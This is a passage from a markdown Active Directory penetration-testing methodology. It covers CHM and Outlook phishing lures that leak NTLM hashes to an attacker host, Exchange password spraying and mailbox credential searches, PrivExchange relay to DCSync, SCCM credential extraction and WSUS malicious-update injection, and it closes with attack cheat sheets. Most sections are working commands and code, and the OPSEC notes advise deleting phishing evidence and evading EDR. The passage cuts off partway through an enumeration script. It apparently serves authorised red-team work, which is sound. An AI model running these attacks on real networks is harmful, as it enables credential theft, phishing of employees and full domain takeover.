> **OPSEC:** SCF is flagged by modern EDR signature sets; `.url` and `desktop.ini` blend with normal share content but produce outbound SMB from workstations to non-DC IPs (high-fidelity IOC). Pair with internal-pivot listener if egress is monitored. Service accounts running scheduled scans through file shares (backup agents, AV, indexers) are the highest-value catches — they often have machine-account or privileged context.

### 11.7b Malicious CHM (Compiled HTML Help) with UNC Image for Hash Leak

A `.chm` file containing an HTML page with an embedded UNC `<img>` tag triggers NTLM authentication when the victim opens the help file. Unlike `.scf`/`.url`/`desktop.ini` (which fire on folder browse), CHM requires a double-click — but CHM files are commonly shared in internal documentation repositories, SharePoint, and helpdesk portals where users trust them.

**Build the malicious CHM:**
```bash
# 1. Create the HTML source file with UNC image reference
mkdir -p /tmp/chm_project
cat > /tmp/chm_project/index.html <<'EOF'
<html>
<head><title>IT Documentation</title></head>
<body>
<h1>Network Configuration Guide</h1>
<p>Please refer to the diagram below:</p>
<img src="\\<ATTACKER_IP>\share\diagram.png" width="1" height="1">
<p>Contact the IT helpdesk for questions.</p>
</body>
</html>
EOF

# 2. Create the HHP (HTML Help Project) file
cat > /tmp/chm_project/project.hhp <<'EOF'
[OPTIONS]
Compatibility=1.1
Compiled file=documentation.chm
Default topic=index.html
Display compile progress=No
Language=0x409 English (United States)

[FILES]
index.html
EOF

# 3. Compile with hhc.exe (Windows HTML Help Compiler — on any Windows box)
# Or use the free-wine approach from Linux:
# Wine path: wine "C:\\Program Files\\HTML Help Workshop\\hhc.exe" project.hhp
# Note: hhc.exe returns exit code 1 on success (quirk)
```

```powershell
# From a Windows pivot — compile the CHM natively
# HTML Help Workshop must be installed (free Microsoft download, commonly on dev boxes)
& "C:\Program Files (x86)\HTML Help Workshop\hhc.exe" C:\temp\project.hhp
# Output: C:\temp\documentation.chm
```

```bash
# 4. Alternative: use nishang Out-CHM (PowerShell — generates CHM with embedded payload)
# Out-CHM creates a CHM that runs arbitrary commands, but for hash-only capture
# we just need the UNC img tag in the HTML source

# 5. Drop the CHM on a writable share / email it / upload to SharePoint
smbclient '//<TARGET>/<SHARE>' -U '<DOMAIN>/<USER>%<PASSWORD>' \
    -c 'put /tmp/chm_project/documentation.chm documentation.chm'
```

**Capture the hash:**
```bash
# Start Responder (or impacket-smbserver) and wait for victim to open the CHM
sudo responder -I <INTERFACE> -wv

# When victim double-clicks the .chm, hh.exe renders the HTML internally
# and the <img src="\\ATTACKER\..."> triggers SMB auth → NTLMv2 hash captured

# Crack
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

#### Living-off-the-land / LOTL variant

```powershell
# Build and compile CHM entirely from a Windows foothold (no tool upload)
$html = @'
<html><body><img src="\\<ATTACKER_IP>\share\x.png" width="1" height="1">
<h1>Updated Procedures</h1></body></html>
'@
$html | Out-File -Encoding ascii C:\temp\index.html

$hhp = @'
[OPTIONS]
Compiled file=guide.chm
Default topic=index.html
[FILES]
index.html
'@
$hhp | Out-File -Encoding ascii C:\temp\project.hhp

# Compile (hhc.exe path varies — check Program Files and x86)
& "${env:ProgramFiles(x86)}\HTML Help Workshop\hhc.exe" C:\temp\project.hhp
# If HTML Help Workshop not installed, the CHM source HTML alone can be shared
# as an .htm file with the same UNC img — but CHM has higher open-rate trust
```

> **CHM vs other lure types:** CHM files bypass Mark-of-the-Web (MOTW) in some configurations because `hh.exe` (the CHM viewer) does not honor zone identifiers the same way Explorer does. On modern Windows 11 with Smart App Control, CHM from external sources may still be blocked — but internal share drops bypass this entirely since the file never carries MOTW.

> **When the standard chain (Phases 1-11) does not yield DA, check Phase 12 (Exchange), Phase 13 (SCCM/MECM), and Phase 14 (WSUS) for alternate paths to domain compromise.**

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 12: Exchange / Mail Server Attacks

**Goal:** Exploit Microsoft Exchange for credential harvesting, privilege escalation, or domain compromise.

### 12.1 OWA Brute-Force & Credential Spraying
```bash
# Spray OWA/EWS with domain credentials
# https://github.com/sensepost/ruler
ruler -k --domain <DOMAIN> --url https://<EXCHANGE_IP>/autodiscover/autodiscover.xml brute --users users.txt --passwords passwords.txt

# MailSniper — password spray against OWA/EWS
# https://github.com/dafthack/MailSniper
# From Windows:
Import-Module .\MailSniper.ps1
Invoke-PasswordSprayOWA -ExchHostname <EXCHANGE_IP> -UserList .\users.txt -Password '<SEASON><YEAR>!' -Threads 15
Invoke-PasswordSprayEWS -ExchHostname <EXCHANGE_IP> -UserList .\users.txt -Password '<SEASON><YEAR>!'
```

### 12.2 Mailbox Search for Credentials
```powershell
# After gaining Exchange access (OWA creds, Exchange admin, or EWS access)
# MailSniper — search all readable mailboxes for passwords/sensitive data
Import-Module .\MailSniper.ps1
Invoke-SelfSearch -Mailbox <USER>@<DOMAIN> -ExchHostname <EXCHANGE_IP> -Terms "password","cred","secret","login","vpn"
# Search other mailboxes (requires Exchange admin or ApplicationImpersonation role):
Invoke-GlobalMailSearch -ImpersonationAccount <EXCHANGE_ADMIN> -ExchHostname <EXCHANGE_IP> -Terms "password"
```

### 12.2b OWA Spear-Phishing for Net-NTLMv2 Hash Capture

After gaining OWA/EWS access with valid credentials, send HTML emails containing embedded UNC paths or external image references to domain users. When the victim's mail client (Outlook desktop) renders the email, it automatically attempts NTLM authentication against the attacker's listener — leaking Net-NTLMv2 hashes without any click required.

**Enumerate targets — Global Address List (GAL) harvesting:**
```bash
# MailSniper — dump the GAL via EWS/OWA
Import-Module .\MailSniper.ps1
Get-GlobalAddressList -ExchHostname <EXCHANGE_IP> -UserName '<USER>@<DOMAIN>' -Password '<PASSWORD>' -OutFile gal.txt

# Or via OWA manually: People → All Users → export

# From Linux — impacket EWS query for GAL (requires Exchange Web Services endpoint)
# Alternative: use ruler to enumerate contacts
ruler -k --domain <DOMAIN> --url https://<EXCHANGE_IP>/autodiscover/autodiscover.xml \
    --username '<USER>' --password '<PASSWORD>' display
```

**Craft and send the phishing email:**
```bash
# Method 1: swaks (Swiss Army Knife for SMTP) — send HTML email with embedded UNC img
swaks --to '<VICTIM>@<DOMAIN>' \
    --from '<USER>@<DOMAIN>' \
    --server <EXCHANGE_IP> \
    --port 587 --tls \
    --auth LOGIN --auth-user '<USER>@<DOMAIN>' --auth-password '<PASSWORD>' \
    --header 'Content-Type: text/html' \
    --body '<html><body>Please review the attached document.<img src="file://<ATTACKER_IP>/share/image.png" width="1" height="1"></body></html>' \
    --header 'Subject: Q3 Budget Review - Action Required'

# Method 2: UNC path via \\server\share format (triggers SMB auth)
swaks --to '<VICTIM>@<DOMAIN>' \
    --from '<USER>@<DOMAIN>' \
    --server <EXCHANGE_IP> \
    --port 587 --tls \
    --auth LOGIN --auth-user '<USER>@<DOMAIN>' --auth-password '<PASSWORD>' \
    --header 'Content-Type: text/html' \
    --body '<html><body><img src="\\\\<ATTACKER_IP>\\share\\logo.png" width="1" height="1"><p>Updated org chart attached.</p></body></html>' \
    --header 'Subject: Updated Org Chart'
```

```python3
# Method 3: Python + exchangelib (more control over EWS)
from exchangelib import Credentials, Account, Message, HTMLBody, Configuration, DELEGATE

creds = Credentials('<USER>@<DOMAIN>', '<PASSWORD>')
config = Configuration(server='<EXCHANGE_IP>', credentials=creds)
account = Account('<USER>@<DOMAIN>', config=config, autodiscover=False, access_type=DELEGATE)

html = '''<html><body>
<p>Please review the shared folder:</p>
<img src="file://<ATTACKER_IP>/share/tracking.png" width="1" height="1">
</body></html>'''

msg = Message(
    account=account,
    subject='Shared Folder Access - IT Department',
    body=HTMLBody(html),
    to_recipients=['<VICTIM>@<DOMAIN>']
)
msg.send()
```

**Capture the hashes:**
```bash
# Start Responder on the interface facing the target network
sudo responder -I <INTERFACE> -wv

# Or use impacket-smbserver for SMB-only capture
impacket-smbserver share /tmp -smb2support

# Hashes appear when victim's Outlook renders the email:
# [SMB] NTLMv2 Hash     : <VICTIM>::<DOMAIN>:<CHALLENGE>:<RESPONSE>:<BLOB>

# Crack offline
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt

# Or relay in real-time (disable SMB in Responder.conf first)
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

#### Living-off-the-land / LOTL variant

```powershell
# From a Windows foothold with OWA access — send via Outlook COM object (no swaks needed)
$ol = New-Object -ComObject Outlook.Application
$mail = $ol.CreateItem(0)
$mail.To = '<VICTIM>@<DOMAIN>'
$mail.Subject = 'Network Share Migration Notice'
$mail.HTMLBody = '<html><body><p>Your home drive has been migrated.</p><img src="\\<ATTACKER_IP>\share\verify.png" width="1" height="1"></body></html>'
$mail.Send()

# Or via Send-MailMessage (PowerShell native — works against SMTP relay)
Send-MailMessage -From '<USER>@<DOMAIN>' -To '<VICTIM>@<DOMAIN>' \
    -Subject 'IT Notice' \
    -Body '<html><body><img src="\\<ATTACKER_IP>\share\x.png"></body></html>' \
    -BodyAsHtml \
    -SmtpServer <EXCHANGE_IP> -Port 587 -UseSsl \
    -Credential (New-Object PSCredential('<USER>@<DOMAIN>',(ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force)))
```

> **Why this works:** Outlook desktop (not OWA web client) renders embedded images with UNC paths by auto-initiating SMB connections. Outlook on the Web (browser) does NOT trigger this — it proxies external images. Target users must have Outlook desktop installed. The 1x1 invisible pixel is the standard technique; no user click required.

> **OPSEC:** Sent emails live in the Sent Items folder — delete them post-capture. The phishing email itself is the primary forensic artifact. Modern Exchange (2019+) with "External Sender" banners will flag the UNC path in some configurations.

### 12.3 PrivExchange — Relay Exchange HTTP to LDAP
```bash
# Exchange servers authenticate to other hosts with high privileges (SYSTEM)
# PrivExchange: coerce Exchange to authenticate → relay to LDAP → grant DCSync rights
# https://github.com/dirkjanm/privexchange

# 1. Start LDAP relay (grant your user DCSync rights)
impacket-ntlmrelayx -t ldap://<DC_IP> --escalate-user '<USER>' -smb2support

# 2. Trigger Exchange authentication via EWS push subscription
python3 privexchange.py -ah <ATTACKER_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> <EXCHANGE_IP>

# 3. Your user now has DCSync rights
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>' -just-dc-ntlm
```

### 12.4 Exchange Group Membership Abuse
```bash
# Organization Management group members have full control over Exchange and can escalate to DA
# Exchange Windows Permissions group members can modify AD ACLs (WriteDACL on domain)

# Check group membership
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" \
  "(&(objectClass=group)(|(cn=Organization Management)(cn=Exchange Windows Permissions)))" member

# If member of Exchange Windows Permissions → grant yourself DCSync directly
impacket-dacledit -action 'write' -rights 'DCSync' -principal '<USER>' \
  -target-dn 'DC=<DOMAIN>,DC=<TLD>' '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

### 12.5 Exchange Trusted Subsystem Abuse
```bash
# The "Exchange Trusted Subsystem" group is a member of "Exchange Windows Permissions"
# Exchange servers are members of this group → any Exchange server has WriteDACL on the domain

# If you compromise an Exchange server machine account:
# Use the machine account to grant DCSync to your user
impacket-dacledit -action 'write' -rights 'DCSync' -principal '<USER>' \
  -target-dn 'DC=<DOMAIN>,DC=<TLD>' '<DOMAIN>/<EXCHANGE_MACHINE>$' -hashes :<MACHINE_NT_HASH> -dc-ip <DC_IP>
```

### 12.6 ProxyLogon / ProxyShell / ProxyNotShell Overview
```bash
# ProxyLogon (CVE-2021-26855 + CVE-2021-27065) — Pre-auth SSRF → RCE
# Affected: Exchange 2013/2016/2019 (unpatched before March 2021)
# Check vulnerability:
curl -k -s "https://<EXCHANGE_IP>/owa/" -o /dev/null -w '%{http_code}'
# Exploit: Multiple public exploits available — search for CVE-2021-26855

# ProxyShell (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207) — Pre-auth RCE chain
# Affected: Exchange 2013/2016/2019 (unpatched before April/May 2021)
# Check: curl -k "https://<EXCHANGE_IP>/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com"

# ProxyNotShell (CVE-2022-41040 + CVE-2022-41082) — Authenticated SSRF → RCE
# Affected: Exchange 2013/2016/2019 (unpatched before November 2022)
# Requires valid credentials — similar to ProxyShell but post-auth
```

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 13: SCCM / MECM Attacks

**Goal:** Exploit System Center Configuration Manager (SCCM/MECM) for credential recovery and lateral movement.

#### TAKEOVER attack matrix (Misconfiguration Manager taxonomy)

Pick by what's reachable + what you have. Source: [Misconfiguration Manager](https://github.com/subat0mik/Misconfiguration-Manager).

| ID | Relay coerced auth to → | Outcome |
|---|---|---|
| TAKEOVER-1 | Site DB (MSSQL) | Hierarchy compromise — most likely path |
| TAKEOVER-2 | Site DB (SMB) | Same as TAKEOVER-1 via SMB transport |
| TAKEOVER-3 | AD CS | Chain with ESC8 → cert as site server → DA |
| TAKEOVER-4 | CAS → child primary site | Cross-site privilege jump |
| TAKEOVER-5 | AdminService REST API | Full SCCM admin via API |
| TAKEOVER-6 | SMS Provider (SMB) | Direct provider compromise |
| TAKEOVER-7 | HA site servers | Lateral between active/standby |
| TAKEOVER-8 | LDAP | RBCD / Shadow Creds on site server |
| TAKEOVER-9 | SQL linked server | Site DB DBA escalation |

Coerce via Phase 11.0 (typically NTLM via SCCM client push — see SharpSCCM `invoke client-push`).
Other categories live in [Misconfiguration Manager](https://github.com/subat0mik/Misconfiguration-Manager): CRED-1..8 (PXE, Policy Request, DPAPI, Site DB, Client Push, AdminService, MP Relay), ELEVATE-1..5, EXEC-1/2 (App/Script Deploy), RECON-1..7.

### 13.1 SCCM Enumeration
```bash
# From Linux — SCCMHunter
# https://github.com/garrettfoster13/sccmhunter
python3 sccmhunter.py find -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -dc-ip <DC_IP>
python3 sccmhunter.py show -users -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -dc-ip <DC_IP>
python3 sccmhunter.py show -computers -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -dc-ip <DC_IP>
```

```powershell
# From Windows — SharpSCCM
# https://github.com/Mayyhem/SharpSCCM
.\SharpSCCM.exe local site-info    # Get local SCCM site info
.\SharpSCCM.exe get site-info -mp <MANAGEMENT_POINT>    # Remote site enumeration
.\SharpSCCM.exe get collections    # List all collections
.\SharpSCCM.exe get devices -c <COLLECTION_ID>    # List devices in a collection
```

### 13.2 Network Access Account (NAA) Credential Recovery
The NAA is stored in WMI and the registry on SCCM clients. If you have local admin on any SCCM client, you can recover these credentials.

```powershell
# SharpSCCM — extract NAA credentials from local WMI/registry
.\SharpSCCM.exe local naa
# Returns: NetworkAccessUsername and NetworkAccessPassword in plaintext

# Manual registry extraction (obfuscated, but recoverable):
# Credentials stored under:
# HKLM\SOFTWARE\Microsoft\CCM\NetworkAccessAccount
```

```bash
# From Linux — if you have admin access to an SCCM client:
# Use impacket to remotely dump NAA creds from WMI
impacket-wmiexec '<DOMAIN>/<USER>:<PASSWORD>@<SCCM_CLIENT_IP>' 'powershell -c "([wmiclass]\"root\\ccm\\policy\\Machine\\ActualConfig:CCM_NetworkAccessAccount\").Instances | Select NetworkAccessUsername, NetworkAccessPassword"'
```

### 13.3 SCCM Task Sequence Credential Extraction
```powershell
# Task sequences can contain credentials (domain join accounts, run-as accounts)
.\SharpSCCM.exe get task-sequences -mp <MANAGEMENT_POINT>
# Plaintext credentials may be embedded in task sequence XML
```

### 13.4 PXE Boot Credential Abuse
```bash
# If SCCM PXE boot is enabled without password protection:
# https://github.com/wavvs/pxethief
# PXEThief can intercept PXE boot media and extract embedded credentials

# 1. Check for PXE on the network
nmap -sU -p 67,68,69,4011 <SCCM_SERVER_IP>

# 2. Extract credentials from PXE boot media (requires network access to SCCM)
python3 pxethief.py <SCCM_SERVER_IP>
# Returns: Domain join account credentials or NAA credentials
```

### 13.5 SCCM Relay Attacks
```bash
# Relay SCCM client registration to gain control over SCCM infrastructure
# Requires: NTLM relay position + SCCM management point accessible

# 1. Coerce authentication from an SCCM site server
python3 PetitPotam.py <ATTACKER_IP> <SCCM_SERVER_IP>

# 2. Relay to the SCCM management point enrollment endpoint
# This can register a rogue client or escalate privileges within SCCM
```

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 14: WSUS Attacks

**Goal:** Exploit Windows Server Update Services (WSUS) to push malicious updates to domain computers.

### 14.1 Enumerate WSUS Configuration
```bash
# Check if WSUS uses HTTP (not HTTPS) — key misconfiguration
# WSUS over HTTP allows MITM/injection of malicious updates
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
# If URL starts with http:// (not https://) → vulnerable

# From Linux — check via registry dump:
netexec smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' -M reg-query -o 'PATH=HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate VALUE=WUServer'
```

### 14.2 SharpWSUS — Inject Malicious Updates (Windows)
```powershell
# https://github.com/nettitude/SharpWSUS
# Requires: access to the WSUS server (local admin or through relay)

# 1. Enumerate WSUS configuration
.\SharpWSUS.exe locate    # Find the WSUS server

# 2. Create a malicious update (e.g., add user to local admins)
.\SharpWSUS.exe create /payload:"C:\temp\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c 'net localgroup administrators <USER> /add'" /title:"Security Update"

# 3. Approve the update for a target computer group
.\SharpWSUS.exe approve /updateid:<UPDATE_GUID> /computername:<TARGET_COMPUTER> /groupname:"Target Group"

# 4. Wait for the client to check for updates (or force: wuauclt /detectnow)
# Client pulls the update → executes the payload as SYSTEM

# 5. Cleanup
.\SharpWSUS.exe delete /updateid:<UPDATE_GUID>
```

### 14.3 PyWSUS — Inject from Linux
```bash
# https://github.com/GoSecure/pywsus
# MITM-based WSUS injection (requires ARP spoofing or network position)

# 1. If you can MITM traffic between a client and the WSUS server (HTTP only):
python3 pywsus.py -H <WSUS_SERVER_IP> -p 8530 -e PsExec64.exe -c '/accepteula -s -d cmd.exe /c "net localgroup administrators <USER> /add"'
```

### 14.4 WSUS Attack Chain Summary
```text
1. Enumerate → find WSUS server, check if HTTP (not HTTPS)
2. Gain access to WSUS server (compromise it, or MITM if HTTP)
3. Inject malicious update → target specific computer or group
4. Approve update → wait for client pull (or force with wuauclt /detectnow)
5. Payload executes as SYSTEM on the target
```

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Quick Reference: "I Have Creds — What Now?" (AD Flow)

```text
Got domain credentials? Follow this order:

1. TEST CREDS EVERYWHERE
   netexec smb <SUBNET>/24 -u '<USER>' -p '<PASS>'        → (Pwn3d!) = admin
   netexec winrm <SUBNET>/24 -u '<USER>' -p '<PASS>'      → shell via evil-winrm
   netexec rdp <SUBNET>/24 -u '<USER>' -p '<PASS>'        → GUI access
   netexec mssql <SUBNET>/24 -u '<USER>' -p '<PASS>'      → xp_cmdshell?

2. BLOODHOUND (run immediately)
   bloodhound-ce-python -u '<USER>' -p '<PASS>' -ns <DC_IP> -d <DOMAIN> -c all --zip
   → Import → "Shortest Path to Domain Admin"
   → Mark owned principals → check outbound edges

3. KERBEROAST
   impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -request
   → Crack with hashcat -m 13100

4. CHECK SHARES (loot for creds, scripts, configs)
   netexec smb <SUBNET>/24 -u '<USER>' -p '<PASS>' --shares
   → Spider interesting shares for passwords

5. CHECK ADCS
   certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable
   → ESC1? Request cert as Administrator (Phase 6.2)

6. PASSWORD POLICY → SPRAY MORE
   netexec smb <DC_IP> -u '<USER>' -p '<PASS>' --pass-pol
   → If lockout threshold allows, spray Season+Year! patterns
```

---

## Quick Reference: BloodHound Edge → Action

> **Canonical Edge → Action map:** [bloodhound-guide.md §Step 6](bloodhound-guide.md#step-6-edge--action-quick-map). The table below extends the canonical map with AD-specific entries (GPO-targeted edges, `MemberOf` group abuses, `HasSIDHistory`) that pair with this methodology's phase numbering.

```text
BloodHound shows an edge from your owned principal? Do this:

GenericAll (user)     → Reset password (bloodyAD) or Shadow Credentials (Phase 4.2)
GenericAll (group)    → Add yourself to group (Phase 4.3)
GenericAll (computer) → RBCD attack (Phase 5.3)
GenericAll (GPO)      → SharpGPOAbuse — add scheduled task or local admin (Phase 4.7)
GenericWrite          → Targeted Kerberoasting or Shadow Credentials (Phase 4.2)
GenericWrite (GPO)    → SharpGPOAbuse — modify GPO settings (Phase 4.7)
WriteSPN              → Set/roast/clear SPN — no pwd change, no Shadow Cred prereq (Phase 4.2a)
WriteDACL             → Grant yourself DCSync rights (Phase 4.4)
WriteDACL (GPO)       → Grant yourself full GPO control → abuse (Phase 4.7)
WriteOwner            → Take ownership → then WriteDACL (Phase 4.5)
ForceChangePassword   → Change target's password (Phase 4.6)
AddMember             → Add yourself to target group (Phase 4.3)
MemberOf (DnsAdmins)  → Load DLL into DNS service on DC (Phase 4.8)
MemberOf (Backup Ops) → Shadow copy NTDS.dit from DC (Phase 8.4)
ReadLAPSPassword      → netexec ldap --laps (Phase 8.2)
ReadGMSAPassword      → netexec ldap --gmsa (Phase 8.1)
CreateChild (OU)      → Invoke-BadSuccessor → dMSA → DCSync (Phase 5.4)
AllowedToDelegate     → Constrained delegation S4U (Phase 5.2)
AllowedToAct          → RBCD already configured → S4U (Phase 5.3)
HasSIDHistory         → Already has privileges of target SID
DCSync                → impacket-secretsdump → game over (Phase 10.1)
Reanimate-Tombstones  → Restore-ADObject — resurrect deleted user (Phase 4.9)
```

---

## Quick Reference: Common Attack Chains

> Supplementary reference: [https://book.hacktricks.wiki](https://book.hacktricks.wiki)

### Chain 1: Password Spray → Kerberoast → Admin
```text
1. Enumerate users (RID brute, Kerbrute)
2. Password spray with common passwords
3. With valid creds → Kerberoast service accounts
4. Crack TGS → service account may be admin somewhere
```

### Chain 2: LLMNR Poisoning → Relay → RBCD → DA
```text
1. Responder → capture NetNTLMv2
2. Crack hash or relay to SMB target
3. On compromised host → enumerate AD → find RBCD path
4. Configure RBCD → S4U → impersonate Administrator
```

### Chain 3: ADCS ESC1 → Domain Admin
```text
1. Enumerate ADCS → find ESC1 template
2. Request certificate as Administrator
3. Authenticate with cert → get NT hash
4. DCSync with Administrator hash
```

### Chain 4: ACL Abuse → DCSync
```text
1. BloodHound → find ACL path to Domain Admins
2. Chain ACL rights (WriteDACL → GenericAll → AddMember)
3. Grant DCSync rights or add to Domain Admins
4. DCSync all hashes
```

---

## Quick Reference: Hashcat Modes for AD Hashes

| Hash Type | Hashcat Mode | Source |
|---|---|---|
| NetNTLMv2 | `-m 5600` | Responder / LLMNR poisoning |
| NetNTLMv1 | `-m 5500` | Responder (rare) |
| NTLM (NT hash) | `-m 1000` | SAM dump / secretsdump |
| AS-REP (Kerberos) | `-m 18200` | GetNPUsers |
| TGS (Kerberoast) | `-m 13100` | GetUserSPNs |
| MSCache2 (DCC2) | `-m 2100` | Cached domain creds |
| Kerberoast AES-128 (TGS-REP etype 17) | `-m 19600` | GetUserSPNs |
| Kerberoast AES-256 (TGS-REP etype 18) | `-m 19700` | GetUserSPNs |
| AS-REP-Roast AES-128 (Pre-Auth etype 17) | `-m 19800` | GetNPUsers |
| AS-REP-Roast AES-256 (Pre-Auth etype 18) | `-m 19900` | GetNPUsers |

---

## Quick Reference: AD Tool Cheatsheet

> Supplementary reference: [https://book.hacktricks.wiki](https://book.hacktricks.wiki)
> Generate reverse shells: [https://www.revshells.com](https://www.revshells.com)
> Windows LOLBins: [https://lolbas-project.github.io](https://lolbas-project.github.io)

| Task | Tool (Linux) | Tool (Windows) |
|---|---|---|
| User enumeration (no creds) | `kerbrute userenum` | `kerbrute.exe userenum` |
| AS-REP Roast | `impacket-GetNPUsers` | `Rubeus.exe asreproast` |
| Kerberoast | `impacket-GetUserSPNs` | `Rubeus.exe kerberoast` |
| Password spray | `netexec smb/ldap`, `kerbrute passwordspray` | `Rubeus.exe brute` *(community-forked builds only — not in mainline Rubeus; use `Invoke-DomainPasswordSpray.ps1` for a universally-available alternative)* |
| BloodHound collection | `bloodhound-ce-python -c all` | `SharpHound.exe -c All` |
| LDAP enumeration | `ldapsearch`, `ldapdomaindump` | `PowerView`, `ADModule` |
| SMB enumeration | `netexec smb --shares/--users` | `PowerView Get-NetShare` |
| Pass-the-Hash | `netexec`, `evil-winrm -H`, `impacket-psexec` | `mimikatz sekurlsa::pth` |
| Pass-the-Ticket | `export KRB5CCNAME`, `impacket -k` | `Rubeus.exe ptt` |
| DCSync | `impacket-secretsdump` | `mimikatz lsadump::dcsync` |
| Golden Ticket | `impacket-ticketer` | `mimikatz kerberos::golden` |
| Silver Ticket | `impacket-ticketer -spn` | `mimikatz kerberos::golden /service` |
| ADCS enumeration | `certipy-ad find -vulnerable` | `Certify.exe find /vulnerable` |
| ADCS exploitation | `certipy-ad req/auth` | `Certify.exe request` |
| Shadow Credentials | `certipy-ad shadow auto` | `Whisker.exe add` |
| ACL abuse | `bloodyAD`, `impacket-dacledit` | `PowerView Set-DomainObject` |
| RBCD | `impacket-rbcd`, `impacket-getST` | `Rubeus.exe s4u` |
| Coercion | `PetitPotam.py`, `Coercer` | `SpoolSample.exe` |
| Relay | `impacket-ntlmrelayx` | N/A (run from Linux) |
| NTDS extraction | `impacket-secretsdump` | `ntdsutil`, `vssadmin` |
| Force password change | `bloodyAD set password`, `net rpc password` | `PowerView Set-DomainUserPassword` |
| GMSA password | `netexec ldap --gmsa`, `gMSADumper.py` | `Get-ADServiceAccount` |
| LAPS password | `netexec ldap --laps` | `Get-ADComputer -Properties ms-Mcs-AdmPwd` |

---

## Quick Reference: Common AD Misconfigurations to Check

Run through this checklist on every AD engagement. Each misconfiguration is an attack vector.

### Network-Level

| Misconfiguration | Check Command | Impact | Attack |
|---|---|---|---|
| LLMNR enabled | `sudo responder -I tun0 -A` (analyze mode) | NetNTLMv2 capture | Responder → crack or relay (1.6) |
| NBT-NS enabled | Same as above | NetNTLMv2 capture | Responder → crack or relay (1.6) |
| IPv6 enabled, no IPv6 DNS | `mitm6 -d <DOMAIN>` | NTLM relay via DHCPv6 | mitm6 → ntlmrelayx (1.7) |
| WPAD enabled | Responder `-w` flag | Proxy credential capture | Responder WPAD → NTLMv2 (1.7) |
| SMB signing disabled | `netexec smb <SUBNET>/24 --gen-relay-list relay.txt` | NTLM relay to SMB | ntlmrelayx → code exec (1.6) |
| LDAP signing not required | `netexec ldap <DC_IP> -u '<USER>' -p '<PASS>' -M ldap-checker` | NTLM relay to LDAP | ntlmrelayx → RBCD/shadow creds (11.6) |
| LDAP channel binding disabled | Same as above | NTLM relay to LDAPS | ntlmrelayx → RBCD (11.6) |

### Kerberos & Authentication

| Misconfiguration | Check Command | Impact | Attack |
|---|---|---|---|
| Pre-auth disabled on accounts | `impacket-GetNPUsers <DOMAIN>/ -no-pass -dc-ip <DC_IP> -usersfile users.txt` | Offline hash cracking | AS-REP Roasting (1.4) |
| SPNs on user accounts | `impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>` | Offline hash cracking | Kerberoasting (3.1) |
| Weak password policy | `netexec smb <DC_IP> -u '<USER>' -p '<PASS>' --pass-pol` | Password spraying | Spray common patterns (1.5) |
| No account lockout | Same as above (check lockout threshold = 0) | Unlimited brute-force | Brute-force any account |
| Password never expires | `ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=65536)"` | Stale passwords | Old passwords likely weak |
| Reversible encryption | `ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=128)"` | Plaintext password recovery | secretsdump extracts plaintext |
| Unconstrained delegation | `ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=524288)"` | TGT capture | Coerce + capture TGT (5.1) |
| Constrained delegation | `ldapsearch ... "(msDS-AllowedToDelegateTo=*)"` | Service impersonation | S4U2Proxy (5.2) |
| MachineAccountQuota > 0 | `netexec ldap <DC_IP> -u '<USER>' -p '<PASS>' -M maq` | Create computer objects | RBCD, noPac, Certifried (8.3) |

### ADCS (Certificate Services)

| Misconfiguration | Check Command | Impact | Attack |
|---|---|---|---|
| Vulnerable cert templates | `certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable` | Domain Admin | ESC1-ESC13 (Phase 6) |
| Web enrollment enabled | `curl -I http://<CA_IP>/certsrv/` | NTLM relay to ADCS | ESC8 (6.4) |
| EDITF_ATTRIBUTESUBJECTALTNAME2 | certipy output shows this flag | Any template → ESC1 | ESC6 (7.1) |

### Group Policy & Secrets

| Misconfiguration | Check Command | Impact | Attack |
|---|---|---|---|
| GPP cpassword in SYSVOL | `netexec smb <DC_IP> -u '<USER>' -p '<PASS>' -M gpp_password` | Plaintext passwords | gpp-decrypt (2.2) |
| LAPS not deployed | `netexec ldap <DC_IP> -u '<USER>' -p '<PASS>' --laps` (empty = no LAPS) | Shared local admin passwords | PtH across hosts |
| LAPS readable by low-priv | Same command (returns passwords = readable) | Local admin on targets | ReadLAPSPassword (8.2) |
| GMSA readable by low-priv | `netexec ldap <DC_IP> -u '<USER>' -p '<PASS>' --gmsa` | Service account compromise | ReadGMSAPassword (8.1) |
| AdminSDHolder backdoor | BloodHound: check AdminSDHolder ACLs | Persistent DA access | ACL abuse (10.8) |
| Print Spooler on DC | `impacket-rpcdump @<DC_IP> \| grep MS-RPRN` | Coerce DC authentication | PrinterBug → relay (11.2) |

### Quick Enumeration Script
```bash
# Run these checks early in every AD engagement (requires valid creds)

# 1. Clock sync (use ntpdig if ntpdate unavailable)
sudo ntpdate <DC_IP> || sudo ntpdig <DC_IP>

# 2. SMB signing
